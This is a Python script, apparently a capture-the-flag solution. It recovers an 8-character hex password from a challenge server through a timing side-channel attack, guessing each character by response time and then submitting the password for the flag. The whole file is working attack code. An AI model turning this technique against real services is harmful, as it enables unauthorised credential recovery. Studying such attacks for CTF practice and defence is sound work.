import time
import socket

# Use lowercase hexadecimal characters as the password is likely in lowercase
hex_chars = '0123456789abcdef'

# Server connection details
HOST = 'challenge.ctf.games'
PORT = 31779

def find_and_submit_password(sock):
    """
    Use timing attack to find the password and submit it in the same connection.
    """
    known_password = ''
    
    for position in range(8): 
        max_time = 0
        correct_char = ''
        
        for ch in hex_chars:
            guess = known_password + ch + '0' * (7 - position)  # Pad the rest
            try:
                # Send the guess while keeping the connection open
                start_time = time.time()
                sock.sendall(guess.encode() + b'\n')
                # Receive response
                response = sock.recv(1024)
                end_time = time.time()
                elapsed_time = end_time - start_time

                print(f'Guess: {guess}, Time: {elapsed_time}')
                
                if elapsed_time > max_time:
                    max_time = elapsed_time
                    correct_char = ch

            except socket.timeout:
                print(f"Timeout occurred for guess: {guess}")
            except socket.error as e:
                print(f"Socket error: {e}")
                break  # Break out of the loop if there's a connection issue

        known_password += correct_char
        print(f'Position {position}: Found character {correct_char}')
    
    print(f'Password found: {known_password}')

    try:
        # Step 2: Submit the complete password within the same connection
        print(f"Submitting password: {known_password}")
        sock.sendall(known_password.encode() + b'\n')
        # Receive the flag
        flag_response = sock.recv(1024)
        print(f'Flag or response: {flag_response.decode()}')
    except socket.timeout:
        print("Timeout occurred while submitting the password.")
    except socket.error as e:
        print(f"Socket error while submitting the password: {e}")

# Step 1: Establish the connection
try:
    with socket.create_connection((HOST, PORT)) as sock:
        sock.settimeout(2)  # Set a reasonable timeout, can be adjusted if needed
        # Receive initial messages from the server (e.g., welcome or instructions)
        initial_data = sock.recv(1024)
        print(initial_data.decode())
        
        # Step 2: Perform timing attack and submit password within the same connection
        find_and_submit_password(sock)

except socket.error as e:
    print(f"Could not connect to the server: {e}")
